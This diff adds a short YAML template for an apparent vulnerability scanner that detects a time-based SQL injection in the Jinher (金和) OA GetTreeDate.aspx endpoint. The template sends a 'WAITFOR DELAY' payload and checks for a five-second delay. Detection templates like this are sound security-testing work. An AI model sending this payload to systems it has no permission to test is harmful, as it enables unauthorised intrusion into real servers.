@@ -1,0 +1,13 @@
+name: 金和OA-GetTreeDate-sql
+description: >-
+  sql注入
+alwaysExecute: false
+timeout: 8
+matchCount: 1
+rules:
+  - method: GET
+    path: /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a5%27+--%20and%201=1
+    expression:
+      status: 200
+      body_all: ["GetTreeDate.aspx?nodeid="]
+      sleep: 5      
